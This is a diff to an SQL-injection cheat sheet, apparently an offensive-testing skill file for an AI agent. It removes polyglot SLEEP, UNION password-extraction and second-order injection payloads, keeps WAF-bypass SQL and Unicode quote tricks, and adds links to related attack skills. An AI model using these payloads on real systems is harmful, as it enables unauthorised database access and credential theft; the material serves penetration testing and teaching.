@@ -445,8 +445,6 @@ Additional WAF bypass patterns:
 
 ---
 
-## 14. WAF BYPASS MATRIX
-
 ### No-Space Bypass
 ```sql
 SELECT/**/username/**/FROM/**/users
@@ -461,36 +459,18 @@ UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
 -- LIMIT alternative: LIMIT 1 OFFSET 0
 ```
 
-### Polyglot Injection
-```sql
-SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
-```
-
-### Routed Injection
-```sql
--- First query returns string used as input to second query:
-' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
--- The returned value becomes part of another SQL context
-```
-
-### Second-Order Injection
-```
--- Step 1: Register username: admin'--
--- Step 2: Trigger password change (uses stored username in SQL)
--- UPDATE users SET password='new' WHERE username='admin'--'
-```
-
-### PDO / Prepared Statement Edge Cases
-```php
-// Unsafe even with PDO when query structure is dynamic:
-$pdo->query("SELECT * FROM " . $_GET['table']);
-// Or when using emulated prepares with multi-query:
-$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
-```
-
 ### Entry Point Detection (Unicode tricks)
 ```
 U+02BA ʺ (modifier letter double prime) → "
 U+02B9 ʹ (modifier letter prime) → '
 %%2727 → %27 → '
 ```
+
+---
+
+## Related Routing
+
+- NoSQL variant (JSON/$ne operators) → [nosql-injection](../nosql-injection/SKILL.md)
+- Command injection after SQLi RCE → [cmdi-command-injection](../cmdi-command-injection/SKILL.md)
+- Auth bypass via SQLi login → [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md)
+- Burp replay / response diff → [burp-mcp-vuln-check](../burp-mcp-vuln-check/SKILL.md)
